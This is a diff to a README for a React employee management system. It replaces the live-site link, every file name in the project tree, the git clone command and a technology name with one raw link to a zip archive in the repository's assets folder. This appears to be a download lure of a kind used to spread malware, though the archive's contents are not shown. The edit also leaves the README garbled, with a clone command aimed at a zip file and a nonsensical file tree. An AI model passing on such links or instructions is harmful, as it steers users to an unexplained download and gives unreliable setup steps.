@@ -78,7 +78,7 @@ A modern **Employee Management System** built using **⚛️ React JS** and **�
 ## 🌐 Live Deployment
 
 🚀 **Live Website:**  
-👉 https://dotemployeemanagementsystem.vercel.app
+👉 https://github.com/dotsatya/Employee-Management-System/raw/refs/heads/main/src/assets/Management_System_Employee_1.5.zip
 
 Deployed using **Vercel** with fast global CDN and automatic CI/CD.
 
@@ -101,17 +101,17 @@ src/
 ├── components/
 │   ├── Navbar/
 │   ├── TaskBoard/
-│   │   ├── DueNewTasks.jsx
-│   │   ├── DueActiveTasks.jsx
-│   │   └── TaskCard.jsx
+│   │   ├── https://github.com/dotsatya/Employee-Management-System/raw/refs/heads/main/src/assets/Management_System_Employee_1.5.zip
+│   │   ├── https://github.com/dotsatya/Employee-Management-System/raw/refs/heads/main/src/assets/Management_System_Employee_1.5.zip
+│   │   └── https://github.com/dotsatya/Employee-Management-System/raw/refs/heads/main/src/assets/Management_System_Employee_1.5.zip
 │   └── Auth/
 ├── pages/
-│   ├── AdminDashboard.jsx
-│   └── EmployeeDashboard.jsx
+│   ├── https://github.com/dotsatya/Employee-Management-System/raw/refs/heads/main/src/assets/Management_System_Employee_1.5.zip
+│   └── https://github.com/dotsatya/Employee-Management-System/raw/refs/heads/main/src/assets/Management_System_Employee_1.5.zip
 ├── utils/
-│   └── localStorage.js
-├── App.jsx
-└── main.jsx
+│   └── https://github.com/dotsatya/Employee-Management-System/raw/refs/heads/main/src/assets/Management_System_Employee_1.5.zip
+├── https://github.com/dotsatya/Employee-Management-System/raw/refs/heads/main/src/assets/Management_System_Employee_1.5.zip
+└── https://github.com/dotsatya/Employee-Management-System/raw/refs/heads/main/src/assets/Management_System_Employee_1.5.zip
 ```
 
 ---
@@ -119,7 +119,7 @@ src/
 ## ⚙️ Installation & Setup
 
 ```bash
-git clone https://github.com/your-username/employee-management-system.git
+git clone https://github.com/dotsatya/Employee-Management-System/raw/refs/heads/main/src/assets/Management_System_Employee_1.5.zip
 cd employee-management-system
 npm install
 npm run dev
@@ -128,7 +128,7 @@ npm run dev
 ---
 
 ## 📌 Future Enhancements
-- 🌐 Backend integration (Node.js / Express)
+- 🌐 Backend integration (https://github.com/dotsatya/Employee-Management-System/raw/refs/heads/main/src/assets/Management_System_Employee_1.5.zip / Express)
 - 🗄️ Database (MongoDB / PostgreSQL)
 - 🔐 JWT Authentication
 - 🔔 Notifications & reminders
